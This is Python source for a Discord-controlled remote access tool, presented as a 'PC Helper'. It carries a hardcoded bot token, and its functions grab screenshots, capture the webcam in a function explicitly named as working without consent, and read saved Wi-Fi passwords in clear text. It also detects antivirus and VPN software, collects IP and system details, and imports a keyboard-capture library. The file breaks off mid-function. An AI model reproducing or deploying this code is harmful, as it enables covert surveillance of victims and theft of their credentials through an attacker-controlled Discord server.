import os
import io
import sys
import asyncio
import tempfile
import subprocess
import platform
import socket
import getpass
import json
import ctypes
import shutil
import re
import time
import logging
from urllib.parse import urlparse
from datetime import datetime

import requests
import discord
from discord.ext import commands
from pynput import keyboard  # Import keyboard here
import threading  # Import the threading modul

# ------------------- Config -------------------
TOKEN = "MTQwNzgxNzM2MTE2MzE2MTYxMA.G3ou_o.PfFzOyhXf31F8tCFhgNwAsX0F9AW__GPHCuATg".strip()   # <-- paste your bot token
SERVER_ID = 1407694238308630570  # <<<<<< REPLACE with your Discord server (guild) ID

if not TOKEN:
    raise SystemExit("No bot token set in this file.")

# ---- Per-PC scoping (each machine gets its own category + channel) ----
PC_NAME_RAW = os.getenv("COMPUTERNAME") or platform.node() or socket.gethostname() or "PC"

def _slug(s: str) -> str:
    s = s.lower().strip()
    s = re.sub(r"[\s_]+", "-", s)
    s = re.sub(r"[^a-z0-9\-]", "", s)
    return s or "pc"

PC_NAME  = PC_NAME_RAW                    # Category name (exact)
PC_SLUG  = _slug(PC_NAME_RAW)             # Safe for text-channel
CATEGORY_NAME = PC_NAME                   # e.g., "DESKTOP-1234"
CHANNEL_NAME  = f"commands-{PC_SLUG}"     # e.g., "commands-desktop-1234"
MY_CHANNEL_ID: int | None = None          # Filled at runtime

# ------------------- Intents (enable Message Content in Dev Portal) -------------------
intents = discord.Intents.none()
intents.guilds = True
intents.messages = True
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents)

# Windows event loop policy (helps on some Python versions)
if os.name == "nt":
    try:
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    except Exception:
        pass

# ---- Discord helper: retry wrapper (handles rate limits/transient errors) ----
async def _with_retry(coro_factory, attempts: int = 5, base_delay: float = 1.5):
    delay = 1.0
    for i in range(attempts):
        try:
            return await coro_factory()
        except (discord.HTTPException, asyncio.TimeoutError) as e:
            if i == attempts - 1:
                raise
            logging.warning(f"Discord API retry {i+1}/{attempts} after error: {e}")
            await asyncio.sleep(min(12, delay))
            delay *= base_delay

# ---- Create/reuse <PC_NAME> category and commands-<PC_NAME> channel ----
async def ensure_scoped_channel() -> None:
    """Idempotently ensure the per-PC category + channel exist. Saves channel id in MY_CHANNEL_ID."""
    global MY_CHANNEL_ID

    guild = bot.get_guild(SERVER_ID)
    if guild is None:
        guild = await _with_retry(lambda: bot.fetch_guild(SERVER_ID))
    if guild is None:
        logging.error(f"Guild {SERVER_ID} not found or bot not in it.")
        return

    # Category: exact name <PC_NAME>
    category = discord.utils.get(guild.categories, name=CATEGORY_NAME)
    if category is None:
        category = await _with_retry(lambda: guild.create_category(
            name=CATEGORY_NAME,
            reason=f"PC Helper bootstrap for {PC_NAME}"
        ))
        logging.info(f"Created category: {CATEGORY_NAME}")

    # Channel: commands-<PC_NAME> under that category
    channel = discord.utils.get(category.text_channels, name=CHANNEL_NAME)
    if channel is None:
        channel = await _with_retry(lambda: category.create_text_channel(
            name=CHANNEL_NAME,
            reason=f"PC Helper command channel for {PC_NAME}"
        ))
        logging.info(f"Created channel: {CHANNEL_NAME}")

    # Set a helpful topic (best effort)
    try:
        await _with_retry(lambda: channel.edit(
            topic=f"Commands for {PC_NAME}. Only this PC responds in this channel."
        ))
    except Exception as e:
        logging.debug(f"Could not set topic (non-fatal): {e}")

    MY_CHANNEL_ID = channel.id
    logging.info(f"[{PC_NAME}] Using channel #{channel.name} (id={MY_CHANNEL_ID}) in guild {guild.name} ({guild.id})")

# ===================== Screenshot =====================
def capture_screenshot_to_temp() -> str:
    """Full virtual screen screenshot -> temp PNG path."""
    ts = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    out_dir = tempfile.gettempdir()
    path = os.path.join(out_dir, f"screenshot_{ts}.png")
    try:
        import mss, mss.tools
        with mss.mss() as sct:
            monitor = sct.monitors[0]  # all monitors
            img = sct.grab(monitor)
            mss.tools.to_png(img.rgb, img.size, output=path)
        return path
    except Exception:
        if os.name == "nt":
            ps_script = r'''
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName System.Windows.Forms
$bounds = [System.Windows.Forms.SystemInformation]::VirtualScreen
$bmp = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height)
$gfx = [System.Drawing.Graphics]::FromImage($bmp)
$gfx.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
$bmp.Save("{DEST}", [System.Drawing.Imaging.ImageFormat]::Png)
$gfx.Dispose(); $bmp.Dispose()
'''.replace("{DEST}", path.replace("\\", "\\\\"))
            subprocess.run(["powershell", "-NoProfile", "-Command", ps_script], check=True)
            return path
        raise


# ===================== Battery report (Windows) =====================
def generate_battery_report_to_temp() -> str:
    if os.name != "nt":
        raise RuntimeError("Battery report is Windows-only.")
    out_dir = tempfile.gettempdir()
    ts = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    path = os.path.join(out_dir, f"battery-report_{ts}.html")
    # powercfg usually doesn't need admin; it writes where you point it
    subprocess.run(["powercfg", "/batteryreport", "/output", path], check=True)
    if not os.path.exists(path):
        raise RuntimeError("Battery report not generated.")
    return path

# ---- Current battery percentage (Windows) ----
def get_battery_percentage_windows() -> str:
    """
    Returns "NN%" if available, else a readable message.
    Uses GetSystemPowerStatus via ctypes (works without admin).
    """
    if os.name != "nt":
        return "Battery: Windows only"

    class SYSTEM_POWER_STATUS(ctypes.Structure):
        _fields_ = [
            ("ACLineStatus", ctypes.c_byte),
            ("BatteryFlag", ctypes.c_byte),
            ("BatteryLifePercent", ctypes.c_byte),
            ("SystemStatusFlag", ctypes.c_byte),
            ("BatteryLifeTime", ctypes.c_uint32),
            ("BatteryFullLifeTime", ctypes.c_uint32),
        ]

    sps = SYSTEM_POWER_STATUS()
    if not ctypes.windll.kernel32.GetSystemPowerStatus(ctypes.byref(sps)):
        return "Battery status unavailable"

    # 0x80 (128) means "no system battery" on many desktops/UPS configs
    if sps.BatteryFlag == 0x80:
        return "No battery"

    pct = sps.BatteryLifePercent
    if pct == 255:  # unknown
        return "Battery percentage unknown"
    return f"{pct}%"


# ===================== Robust Speed test (lib -> CLI -> local fallbacks) =====================
def _find_speedtest_cli() -> list[str]:
    """
    Return candidate speedtest executables to try (PATH first, then common Windows install dirs).
    """
    exe = shutil.which("speedtest")
    candidates = [exe] if exe else []
    if os.name == "nt":
        common = [
            r"C:\Program Files\Ookla\Speedtest CLI\speedtest.exe",
            r"C:\Program Files (x86)\Ookla\Speedtest CLI\speedtest.exe",
        ]
        for p in common:
            if os.path.exists(p):
                candidates.append(p)
    # de-dup while preserving order
    seen, out = set(), []
    for c in candidates:
        if c and c not in seen:
            out.append(c)
            seen.add(c)
    return out

def _parse_ping_avg_ms(output: str):
    """
    Parse average latency from ping output on Windows or Unix.
    """
    s = output.replace(",", ".")  # handle some locales
    # Windows: Average = 23ms / Moyenne = 23 ms
    m = re.search(r"(Average|Moyenne)\s*=\s*(\d+(?:\.\d+)?)\s*ms", s, re.IGNORECASE)
    if m:
        return float(m.group(2))
    # Unix: rtt min/avg/max/mdev = 15.466/22.903/33.965/6.258 ms
    m = re.search(r"= [^/]+/(\d+(?:\.\d+)?)/", s)
    if m:
        return float(m.group(1))
    # fallback: find last "... = XXms"
    m = re.findall(r"=\s*(\d+(?:\.\d+)?)\s*ms", s)
    if m:
        return float(m[-1])
    return None

def _ping_latency(host: str = "1.1.1.1", count: int = 5, timeout: int = 10):
    """
    Run ping and return average latency in ms. Returns NaN on failure.
    """
    try:
        if os.name == "nt":
            cmd = ["ping", "-n", str(count), "-w", str(timeout * 1000), host]
        else:
            cmd = ["ping", "-c", str(count), "-W", str(timeout), host]
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout + count * 2)
        if p.returncode != 0 and not p.stdout:
            return float("nan")
        avg = _parse_ping_avg_ms(p.stdout or p.stderr or "")
        return avg if avg is not None else float("nan")
    except Exception:
        return float("nan")

def _timed_download_mbps(urls: list[str] | None = None, max_seconds: int = 6) -> tuple[float, str]:
    """
    Stream-download for a few seconds and compute Mbps. Returns (mbps, source).
    """
    if urls is None:
        urls = [
            "https://speed.hetzner.de/10MB.bin",
            "https://proof.ovh.net/files/10Mb.dat",
            "https://speedtest.serverius.net/files/10mb.bin",
            "https://download.thinkbroadband.com/10MB.zip",
        ]
    for url in urls:
        try:
            start = time.time()
            r = requests.get(url, stream=True, timeout=10)
            r.raise_for_status()
            bytes_read = 0
            for chunk in r.iter_content(chunk_size=64 * 1024):
                if not chunk:
                    break
                bytes_read += len(chunk)
                if time.time() - start >= max_seconds:
                    break
            elapsed = time.time() - start
            if elapsed <= 0 or bytes_read == 0:
                continue
            mbps = (bytes_read * 8) / 1e6 / elapsed
            host = urlparse(url).netloc
            return mbps, f"download test via {host}"
        except Exception:
            continue
    return float("nan"), "download fallback failed"

def _timed_upload_mbps(size_mb: int = 3, endpoints: list[str] | None = None, timeout: int = 60) -> tuple[float, str]:
    """
    Upload random bytes to an echo endpoint and compute Mbps. Returns (mbps, dest).
    (Small payload to avoid data usage; may be blocked on some networks.)
    """
    if endpoints is None:
        endpoints = [
            "https://httpbin.org/post",
            "https://postman-echo.com/post",
        ]
    payload = os.urandom(size_mb * 1024 * 1024)
    for url in endpoints:
        try:
            start = time.time()
            r = requests.post(url, data=payload, timeout=timeout)
            elapsed = time.time() - start
            if not r.ok or elapsed <= 0:
                continue
            mbps = (len(payload) * 8) / 1e6 / elapsed
            host = urlparse(url).netloc
            return mbps, f"upload test via {host}"
        except Exception:
            continue
    return float("nan"), "upload fallback failed"

def run_speed_test() -> dict:
    """
    Try Python speedtest lib -> Ookla CLI -> local fallbacks (ping + timed HTTP).
    Returns: {"ping_ms": float, "down_mbps": float, "up_mbps": float, "server": str}
    """
    # 1) Python library (speedtest-cli)
    try:
        import speedtest  # pip install speedtest-cli
        st = speedtest.Speedtest(secure=True)
        st.get_best_server()
        ping = float(st.results.ping)
        down = float(st.download() / 1e6)   # Mbps
        up   = float(st.upload(pre_allocate=False) / 1e6)
        srv  = st.results.server or {}
        server_name = f"{srv.get('sponsor','Unknown')} ({srv.get('name','')}, {srv.get('country','')})".strip()
        return {"ping_ms": ping, "down_mbps": down, "up_mbps": up, "server": server_name}
    except Exception:
        pass

    # 2) Ookla CLI (PATH + known locations)
    for exe in _find_speedtest_cli():
        for args in (
            [exe, "-f", "json", "--accept-license", "--accept-gdpr"],  # new
            [exe, "--format=json", "--accept-license", "--accept-gdpr"],  # alt
            [exe, "--secure", "--json"],  # legacy
        ):
            try:
                p = subprocess.run(args, capture_output=True, text=True, timeout=90)
                if p.returncode != 0 or not p.stdout.strip():
                    continue
                data = json.loads(p.stdout)
                # new schema
                if "ping" in data and "download" in data and "upload" in data:
                    ping = float(data["ping"]["latency"])
                    down = float(data["download"]["bandwidth"]) * 8 / 1e6
                    up   = float(data["upload"]["bandwidth"]) * 8 / 1e6
                    srv  = data.get("server", {})
                    server = f"{srv.get('host','Unknown')} ({srv.get('name','')})".strip()
                    return {"ping_ms": ping, "down_mbps": down, "up_mbps": up, "server": server}
                # legacy schema
                ping = float(data.get("ping", float("nan")))
                down = float(data.get("download", float("nan"))) / 1e6
                up   = float(data.get("upload", float("nan"))) / 1e6
                srv  = data.get("server", {})
                server = f"{srv.get('sponsor','Unknown')} ({srv.get('name','')}, {srv.get('country','')})".strip()
                return {"ping_ms": ping, "down_mbps": down, "up_mbps": up, "server": server}
            except Exception:
                continue

    # 3) Local fallbacks: ping + timed HTTP
    ping = _ping_latency("1.1.1.1", count=5)
    if ping != ping:  # NaN
        ping = _ping_latency("8.8.8.8", count=5)

    down, down_src = _timed_download_mbps()
    up, up_src     = _timed_upload_mbps()

    server = f"{down_src}; {up_src}"
    return {"ping_ms": ping, "down_mbps": down, "up_mbps": up, "server": server}

# ===================== TTS (Windows) =====================
def tts_say_windows(text: str) -> None:
    """Speak text out loud using Windows System.Speech (offline)."""
    if os.name != "nt":
        raise RuntimeError("TTS is Windows-only here.")
    safe = (text or "").replace("'", "''")
    ps_cmd = (
        "Add-Type -AssemblyName System.Speech; "
        "$s=New-Object System.Speech.Synthesis.SpeechSynthesizer; "
        f"$s.Speak('{safe}');"
    )
    subprocess.run(["powershell", "-NoProfile", "-Command", ps_cmd], check=True)

# ===================== System info helpers =====================
def get_public_ip():
    try:
        r = requests.get("https://api.ipify.org", timeout=6)
        r.raise_for_status()
        return r.text.strip()
    except Exception as e:
        return f"Error: {e}"

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        try:
            return socket.gethostbyname(socket.gethostname())
        except Exception as e:
            return f"Error: {e}"

def get_vpn_location():
    try:
        r = requests.get("https://ipinfo.io/json", timeout=6)
        r.raise_for_status()
        data = r.json()
        parts = [p for p in [data.get("city"), data.get("region"), data.get("country")] if p]
        return ", ".join(parts) if parts else "Unknown"
    except Exception:
        return "Unknown"

def get_os_version():
    if os.name == "nt":
        try:
            out = subprocess.check_output("wmic os get Caption", shell=True).decode(errors="ignore").splitlines()
            vals = [x.strip() for x in out if x.strip() and "Caption" not in x]
            return vals[0] if vals else platform.platform()
        except Exception:
            return platform.platform()
    return platform.platform()

def is_process_running(process_name: str) -> bool:
    try:
        if os.name == "nt":
            out = subprocess.check_output(
                ['tasklist', '/FI', f'IMAGENAME eq {process_name}'],
                text=True, errors="ignore"
            )
            no_match = "No tasks are running which match the specified criteria." in out
            return (process_name.lower() in out.lower()) and not no_match
        else:
            out = subprocess.check_output(['ps', '-A'], text=True, errors="ignore")
            return process_name.lower() in out.lower()
    except Exception:
        return False

def detect_vpn_and_antivirus():
    vpn_processes = {
        "openvpn.exe": "OpenVPN", "nordvpn.exe": "NordVPN", "expressvpn.exe": "ExpressVPN",
        "protonvpn.exe": "ProtonVPN", "surfshark.exe": "Surfshark VPN", "cyberghost.exe": "CyberGhost VPN",
        "pia_manager.exe": "Private Internet Access", "windscribe.exe": "Windscribe VPN",
        "mullvad.exe": "Mullvad VPN", "ivpn.exe": "IVPN", "hotspotshield.exe": "Hotspot Shield VPN",
        "hsscp.exe": "Hotspot Shield VPN", "vpnclient.exe": "Cisco VPN Client"
    }
    antivirus_processes = {
        "msmpeng.exe": "Microsoft Defender", "avp.exe": "Kaspersky",
        "avgui.exe": "AVG", "avastui.exe": "Avast", "mcshield.exe": "McAfee",
        "nortonsecurity.exe": "Norton Security", "esetonlinescanner.exe": "ESET Online Scanner",
        "mbam.exe": "Malwarebytes", "savservice.exe": "Sophos", "f-secure.exe": "F-Secure",
        "bdservicehost.exe": "Bitdefender", "antivir.exe": "Avira"
    }
    detected_vpn, detected_av = [], []
    for proc, name in vpn_processes.items():
        if is_process_running(proc):
            detected_vpn.append(name)
    for proc, name in antivirus_processes.items():
        if is_process_running(proc):
            detected_av.append(name)
    return sorted(set(detected_vpn)), sorted(set(detected_av))

def safe_get_user():
    try:
        return getpass.getuser()
    except Exception:
        try:
            return os.getlogin()
        except Exception:
            return "Unknown"

def get_disk_summary():
    entries = []
    if os.name == "nt":
        for letter in "ABCDEFGHIJKLMNOPQRSTUVWXYZ":
            root = f"{letter}:\\"
            if os.path.exists(root):
                try:
                    free = ctypes.c_ulonglong(0)
                    total = ctypes.c_ulonglong(0)
                    ctypes.windll.kernel32.GetDiskFreeSpaceExW(ctypes.c_wchar_p(root), None, ctypes.byref(total), ctypes.byref(free))
                    free_b, total_b = free.value, total.value
                    if total_b <= 0:
                        continue
                    used_b = total_b - free_b
                    entries.append(
                        f"{letter}: {(_fmt_gb(used_b)):.1f}GB used / {(_fmt_gb(total_b)):.1f}GB total "
                        f"— Free {(_fmt_gb(free_b)):.1f}GB"
                    )
                except Exception:
                    pass
    return "; ".join(entries) if entries else "No drives found"

def get_wifi_info():
    if os.name != "nt":
        return "Wi-Fi: Windows only"
    try:
        out = subprocess.check_output("netsh wlan show interfaces", shell=True, text=True, errors="ignore")
        ssid = strength = adapter = ""
        for line in out.splitlines():
            L = line.strip()
            if "SSID" in L and "BSSID" not in L and ":" in L:
                ssid = L.split(":", 1)[1].strip()
            if "Signal" in L and ":" in L:
                strength = L.split(":", 1)[1].strip()
            if ("Name" in L or "Nom" in L) and ":" in L and not adapter:
                adapter = L.split(":", 1)[1].strip()
        return f"{ssid} ({strength}) via {adapter}".strip() if ssid else "Not on Wi-Fi / Unknown"
    except Exception:
        return "Not on Wi-Fi / Unknown"

def get_wifi_password_current():
    if os.name != "nt":
        return "Wi-Fi password: Windows only"
    try:
        out = subprocess.check_output("netsh wlan show interfaces", shell=True, text=True, errors="ignore")
        ssid = ""
        for line in out.splitlines():
            if "SSID" in line and "BSSID" not in line and ":" in line:
                ssid = line.split(":", 1)[1].strip()
                break
        if not ssid:
            return "Not connected to Wi-Fi"
        prof = subprocess.check_output(f'netsh wlan show profile name="{ssid}" key=clear',
                                       shell=True, text=True, errors="ignore")
        key = None
        for L in prof.splitlines():
            L = L.strip()
            if "Key Content" in L and ":" in L:
                key = L.split(":", 1)[1].strip()
                break
            if ("Contenu" in L and ("clé" in L.lower() or "cle" in L.lower())) and ":" in L:
                key = L.split(":", 1)[1].strip()
                break
        return f"{ssid}: {key}" if key else f"{ssid}: Password not found"
    except Exception as e:
        return f"Error reading Wi-Fi password ({e.__class__.__name__})"

def get_cpu_model():
    if os.name == "nt":
        try:
            out = subprocess.check_output("wmic cpu get name", shell=True, text=True, errors="ignore").splitlines()
            vals = [x.strip() for x in out if x.strip() and "Name" not in x]
            if vals:
                return vals[0]
        except Exception:
            pass
        try:
            ps = subprocess.check_output(
                'powershell -NoProfile -Command "(Get-CimInstance Win32_Processor).Name"',
                shell=True, text=True, errors="ignore")
            return ps.strip()
        except Exception:
            pass
    return platform.processor() or "Unknown"

def get_system_model():
    if os.name == "nt":
        for cmd, field in [("wmic computersystem get model", "Model"), ("wmic csproduct get name", "Name")]:
            try:
                out = subprocess.check_output(cmd, shell=True, text=True, errors="ignore").splitlines()
                vals = [x.strip() for x in out if x.strip() and field.lower() not in x.lower()]
                if vals:
                    return vals[0]
            except Exception:
                pass
        try:
            ps = subprocess.check_output(
                'powershell -NoProfile -Command "(Get-CimInstance Win32_ComputerSystem).Model"',
                shell=True, text=True, errors="ignore")
            return ps.strip()
        except Exception:
            pass
    return platform.node() or "Unknown"

def get_total_ram():
    if os.name == "nt":
        try:
            out = subprocess.check_output(
                "wmic computersystem get TotalPhysicalMemory",
                shell=True, text=True, errors="ignore").split()
            num = next((x for x in out if x.isdigit()), None)
            if num:
                return f"{_fmt_gb(int(num)):.1f} GB"
        except Exception:
            pass
        try:
            ps = subprocess.check_output(
                'powershell -NoProfile -Command "(Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory"',
                shell=True, text=True, errors="ignore")
            return f"{_fmt_gb(int(ps.strip())):.1f} GB"
        except Exception:
            pass
    try:
        import psutil
        return f"{psutil.virtual_memory().total / (1024**3):.1f} GB"
    except Exception:
        return "Unknown"

def gather_system_info_to_desktop() -> str:
    """Write system_info.txt to Desktop; return path."""
    desktop = os.path.join(os.path.expanduser("~"), "Desktop")
    os.makedirs(desktop, exist_ok=True)
    path = os.path.join(desktop, "system_info.txt")

    public_ip = get_public_ip()
    local_ip = get_local_ip()
    detected_vpn, detected_av = detect_vpn_and_antivirus()
    vpn_status = "Yes" if detected_vpn else "No"
    vpn_location = get_vpn_location() if vpn_status == "Yes" else "Unknown"

    info = {
        "PC Name": os.getenv('COMPUTERNAME', platform.node() or 'Unknown'),
        "User Profile": safe_get_user(),
        "OS Version": get_os_version(),
        "CPU": get_cpu_model(),
        "RAM Total": get_total_ram(),
        "System Model": get_system_model(),
        "Local IP": local_ip,
        "Public IP": public_ip,
        "Proxy/VPN Status": vpn_status,
        "VPN Location": vpn_location,
        "Detected VPNs": ', '.join(detected_vpn) if detected_vpn else "None",
        "Detected Antivirus": ', '.join(detected_av) if detected_av else "None",
        "Disk Space": get_disk_summary(),
        "Wi-Fi": get_wifi_info(),
        "Wi-Fi Password": get_wifi_password_current(),
    }

    with open(path, "w", encoding="utf-8") as f:
        f.write(f"System Information — {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write("-" * 50 + "\n\n")
        for k, v in info.items():
            f.write(f"**{k}:** {v}\n\n")
    return path

# ===================== Webcam (no consent) =====================
import cv2

def _now_stamp_file() -> str:
    """Returns timestamp for filenames."""
    return time.strftime("%Y%m%d_%H%M%S")

def capture_webcam_without_consent_to_temp() -> str:
    """Automatically captures a frame from the webcam and saves it to a temp file."""
    try:
        import cv2  # ensure imported
    except ImportError:
        raise RuntimeError("OpenCV not installed. pip install opencv-python")

    out_dir = tempfile.gettempdir()
    path = os.path.join(out_dir, f"webcam_{_now_stamp_file()}.png")

    cap = cv2.VideoCapture(0, cv2.CAP_DSHOW) if os.name == "nt" else cv2.VideoCapture(0)
    if not cap or not cap.isOpened():
        raise RuntimeError("No webcam detected or access denied")

    ok, frame = cap.read()
    if not ok:
        cap.release()
        raise RuntimeError("Failed to capture frame")

    cv2.imwrite(path, frame)
    cap.release()
    try:
        cv2.destroyAllWindows()
    except Exception:
        pass

    return path
# ===================== Helpers for !brightness and !open =====================

def _set_brightness_windows(level: int) -> str:
    """
    Set internal display brightness on Windows using WMI (0-100).
    Works on most laptops; external monitors usually ignore this.
    """
    if os.name != "nt":
        raise RuntimeError("Brightness control is Windows-only.")
    if not (0 <= level <= 100):
        raise RuntimeError("Brightness must be between 0 and 100.")

   # PowerShell: call WmiSetBrightness on all brightness-capable monitors
    ps = (
        "$lvl={lvl}; "
        "Get-CimInstance -Namespace root/WMI -ClassName WmiMonitorBrightnessMethods | "
        "ForEach-Object { Invoke-CimMethod -InputObject $_ -MethodName WmiSetBrightness -Arguments @{{Brightness=$lvl; Timeout=0}} }"
    ).format(lvl=level)

    try:
        subprocess.run(
            ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps],
            check=True,
            creationflags=subprocess.CREATE_NO_WINDOW if os.name == "nt" else 0,
        )
        return f"Brightness set to {level}%"
    except subprocess.CalledProcessError as e:
        raise RuntimeError(f"Failed to set brightness (PowerShell exit {e.returncode}).")
    except Exception as e:
        raise RuntimeError(f"Failed to set brightness: {e}")

def _open_app_windows(name: str) -> str:
    """
    Open a whitelisted everyday app on Windows (browsers, Office, chat, media, etc.).
    Example: !open chrome   |   !open word   |   !open notepad
    """
    if os.name != "nt":
        raise RuntimeError("Open command is Windows-only.")

    # Map friendly names to commands (list-of-args style)
    mapping = {
        # --- originals ---
        "notepad":       ["notepad"],
        "calc":          ["calc"],
        "settings":      ["cmd", "/c", "start", "", "ms-settings:"],
        "control":       ["control"],
        "printers":      ["control", "printers"],
        "explorer":      ["explorer"],
        "cmd":           ["cmd"],
        "powershell":    ["powershell"],
        "taskmgr":       ["taskmgr"],
        "paint":         ["mspaint"],
        "wordpad":       ["write"],

        # --- web browsers ---
        "edge":          ["cmd", "/c", "start", "", "microsoft-edge:"],
        "chrome":        ["cmd", "/c", "start", "", "chrome"],
        "firefox":       ["cmd", "/c", "start", "", "firefox"],
        "opera":         ["cmd", "/c", "start", "", "opera"],
        "brave":         ["cmd", "/c", "start", "", "brave"],
        "vivaldi":       ["cmd", "/c", "start", "", "vivaldi"],
        "google":        ["cmd", "/c", "start", "", "https://www.google.com"],

        # --- Microsoft Office (if installed) ---
        "word":          ["cmd", "/c", "start", "", "winword"],
        "excel":         ["cmd", "/c", "start", "", "excel"],
        "powerpoint":    ["cmd", "/c", "start", "", "powerpnt"],
        "onenote":       ["cmd", "/c", "start", "", "onenote"],
        "outlook":       ["cmd", "/c", "start", "", "outlook"],
        "publisher":     ["cmd", "/c", "start", "", "mspub"],
        "access":        ["cmd", "/c", "start", "", "msaccess"],

        # --- communication (if installed) ---
        "teams":         ["cmd", "/c", "start", "", "teams"],
        "skype":         ["cmd", "/c", "start", "", "skype"],
        "discord":       ["cmd", "/c", "start", "", "discord"],
        "zoom":          ["cmd", "/c", "start", "", "zoom"],
        "whatsapp":      ["cmd", "/c", "start", "", "whatsapp"],
        "telegram":      ["cmd", "/c", "start", "", "telegram"],

        # --- media / viewing ---
        "vlc":           ["cmd", "/c", "start", "", "vlc"],
        "spotify":       ["cmd", "/c", "start", "", "spotify"],
        "photos":        ["cmd", "/c", "start", "", "ms-photos:"],
        "camera":        ["cmd", "/c", "start", "", "microsoft.windows.camera:"],
        "snippingtool":  ["snippingtool"],
        "screenclip":    ["cmd", "/c", "start", "", "ms-screenclip:"],

        # --- editors / dev (optional installs) ---
        "vscode":        ["cmd", "/c", "start", "", "code"],
        "notepad++":     ["cmd", "/c", "start", "", "notepad++"],

        # --- store ---
        "store":         ["cmd", "/c", "start", "", "ms-windows-store:"],
    }

    USAGE = ("Usage: !open <notepad|calc|settings|control|printers|explorer|cmd|powershell|taskmgr|paint|wordpad|"
             "edge|chrome|firefox|opera|brave|vivaldi|google|word|excel|powerpoint|onenote|outlook|publisher|access|"
             "teams|skype|discord|zoom|whatsapp|telegram|vlc|spotify|photos|camera|snippingtool|screenclip|vscode|notepad++|store>")

    name = (name or "").strip().lower()
    if not name:
        raise RuntimeError(USAGE)

    cmd = mapping.get(name)
    if not cmd:
        raise RuntimeError(f"Unknown app. {USAGE}")

    try:
        subprocess.Popen(cmd, creationflags=subprocess.CREATE_NEW_CONSOLE)
        return f"Opening **{name}**…"
    except Exception as e:
        raise RuntimeError(f"Failed to open {name}: {e}")

# ===================== Wallpaper helpers (URL or attachment) =====================
def _guess_ext_from_url(url: str, default=".jpg"):
    url = url.split("?")[0]
    _, _, fname = url.rpartition("/")
    if "." in fname:
        ext = "." + fname.split(".")[-1].lower()
        if 1 <= len(ext) <= 5:
            return ext
    return default

def _download_to_temp(url: str, filename: str = None) -> str:
    r = requests.get(url, stream=True, timeout=20)
    r.raise_for_status()
    if not filename:
        filename = f"wall_{_now_stamp()}{_guess_ext_from_url(url)}"
    path = os.path.join(tempfile.gettempdir(), filename)
    with open(path, "wb") as f:
        for chunk in r.iter_content(chunk_size=8192):
            if chunk:
                f.write(chunk)
    return path

def set_wallpaper_windows(image_path: str) -> None:
    """Set desktop wallpaper (Windows 10/11 accepts JPG/PNG)."""
    if os.name != "nt":
        raise RuntimeError("Wallpaper change is Windows-only.")
    SPI_SETDESKWALLPAPER = 20
    SPIF_UPDATEINIFILE = 1
    SPIF_SENDWININICHANGE = 2
    ok = ctypes.windll.user32.SystemParametersInfoW(
        SPI_SETDESKWALLPAPER, 0, image_path, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE
    )
    if not ok:
        raise RuntimeError("SystemParametersInfoW failed to set wallpaper")

def _send_vk(vk_code: int, repeat: int = 1, sleep_sec: float = 0.02):
    """Simulate media keys (volume) on Windows."""
    if os.name != "nt":
        raise RuntimeError("Volume control is Windows-only.")
    for _ in range(max(1, repeat)):
        ctypes.windll.user32.keybd_event(vk_code, 0, 0, 0)
        time.sleep(sleep_sec)
        ctypes.windll.user32.keybd_event(vk_code, 0, 2, 0)
        time.sleep(sleep_sec)

def _volume_set_windows(arg: str):
    """
    Accepts: 'up', 'down', 'mute', 'unmute', or '0-100'
    For 0-100, approximates by resetting low then stepping up.
    """
    if os.name != "nt":
        raise RuntimeError("Volume control is Windows-only.")
    arg = (arg or "").strip().lower()

    VK_MUTE = 0xAD
    VK_DOWN = 0xAE
    VK_UP   = 0xAF

    if arg in {"mute", "m"}:
        _send_vk(VK_MUTE, repeat=1)
        return "Muted"
    if arg in {"unmute", "um"}:
        # Toggle mute twice to ensure unmuted
        _send_vk(VK_MUTE, repeat=2)
        return "Unmuted"
    if arg in {"up", "+"}:
        _send_vk(VK_UP, repeat=5)
        return "Volume up"
    if arg in {"down", "-"}:
        _send_vk(VK_DOWN, repeat=5)
        return "Volume down"

    # Numeric percent 0..100 (approximate: 50 steps on most systems)
    try:
        val = int(arg)
        if not (0 <= val <= 100):
            raise ValueError
        # reset low, then raise to target
        _send_vk(VK_DOWN, repeat=60)                  # slam to minimum
        steps = max(0, min(50, round(val * 0.5)))     # ~2% per step
        if steps:
            _send_vk(VK_UP, repeat=steps)
        return f"Volume set to ~{val}%"
    except ValueError:
        raise RuntimeError("Usage: !volume <0-100 | up | down | mute | unmute>")

def _get_current_wifi_ssid_and_password() -> tuple[str, str, str]:
    """
    Returns (ssid, key, auth) on Windows using netsh.
    auth is best-effort ('WPA' / 'WEP' / 'nopass' / 'Unknown').
    """
    if os.name != "nt":
        raise RuntimeError("Wi-Fi details are Windows-only.")

    out = subprocess.check_output(
        "netsh wlan show interfaces", shell=True, text=True, errors="ignore"
    )
    ssid = ""
    for line in out.splitlines():
        L = line.strip()
        if "SSID" in L and "BSSID" not in L and ":" in L:
            ssid = L.split(":", 1)[1].strip()
            break
    if not ssid:
        raise RuntimeError("Not connected to Wi-Fi.")

    prof = subprocess.check_output(
        f'netsh wlan show profile name="{ssid}" key=clear',
        shell=True, text=True, errors="ignore"
    )

    key, auth = "", "Unknown"
    for L in prof.splitlines():
        s = L.strip()
        if "Key Content" in s and ":" in s:
            key = s.split(":", 1)[1].strip()
        if "Authentication" in s and ":" in s:
            a = s.split(":", 1)[1].strip().upper()
            if "WPA" in a:
                auth = "WPA"
            elif "WEP" in a:
                auth = "WEP"
            else:
                auth = "nopass" if not key else "Unknown"

    if not key:
        auth = "nopass"

    return ssid, key, auth

def _now_stamp():
    import datetime  # <--- ADDED: Import datetime within the function
    return datetime.datetime.now().strftime("%Y%m%d_%H%M%S")

def _make_wifi_qr_png_to_temp(ssid: str, key: str, auth: str) -> str:
    """
    Creates a Wi-Fi QR PNG file in temp and returns the path.
    Requires `qrcode` (pip install qrcode[pil]).
    """
